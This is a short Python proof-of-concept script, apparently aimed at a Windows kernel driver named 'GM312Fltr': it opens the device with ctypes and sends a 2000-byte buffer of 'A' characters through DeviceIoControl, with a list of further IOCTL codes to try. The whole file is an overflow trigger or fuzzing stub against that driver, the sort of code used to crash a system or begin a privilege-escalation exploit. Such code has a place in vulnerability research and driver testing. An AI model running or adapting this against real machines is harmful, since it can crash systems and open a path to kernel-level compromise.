import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv

devicename = "GM312Fltr"

ioctl = 0x22245C

ioctl_list = '''
0x22245C
0x222440
0x222441
0x222400
0x222404
0x222408
0x222420
0x222424
0x222448
0x222450
0x22245c
0x222460
'''

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\GM312Fltr", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print ("Not Win! Sorry!")

else:
    print ("OPENED!")
                    
    buf = 'A' * 2000
    bufLength = 2000
    
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

